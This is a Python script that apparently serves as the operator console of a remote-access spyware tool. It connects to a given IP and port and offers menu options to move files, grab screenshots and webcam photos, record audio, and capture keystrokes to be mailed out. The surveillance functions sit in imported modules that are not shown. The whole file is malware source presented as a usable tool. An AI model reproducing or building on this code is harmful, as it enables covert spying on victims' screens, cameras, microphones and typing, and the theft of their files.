from termcolor import colored
import socket
import sys
from suploadfile import uploadfile
from sdownloadfile import downloadfile
from executeonhost import execonhost
from skeylogger import keylogger

ip = sys.argv[1]
port = int(sys.argv[2])

#print (f'IP global: {ip}, Port global: {port}')

def upload():
#	print (f'IP: {ip}, Port: {port}')
	uploadfile(ip,port)

def download():
	downloadfile(ip,port)

def grab_screenshot():
	execonhost(ip,port)

def capture_camera():
	execonhost(ip,port)

def record_audio():
	execonhost(ip,port,'audio')

def logkeystrokes():
	keylogger(ip,port)

if __name__ == "__main__":

	if len(sys.argv) == 1:
		print (colored("ERR!!!Please enter the ip address and port number of the server",'red'))
		exit()

	while True:
		print ()
		print ("="*42)
		print ("||	1.Upload a file			||")
		print ("||	2.Download a file		||")
		print ("||	3.Grab a Screenshot		||")
		print ("||	4.Grab a photo from WebCam	||")
		print ("||	5.Record audio			||")
		print ("||	6.Capture keystrokes and mail	||")
		print ("||	7.Exit				||")
		print ("="*42)

		print ()
		choice = int(input("Enter your prefered action: "))
		print ()

		match choice:
			case 1:
				upload()
			case 2:
				download()
			case 3:
				grab_screenshot()
			case 4:
				capture_camera()
			case 5:
				record_audio()
			case 6:
				logkeystrokes()
			case 7:
				print (colored("Thank you for using this script",'green'))
				break
			case _:
				print (colored("Invalid choice! Exiting.....",'red'))
				break
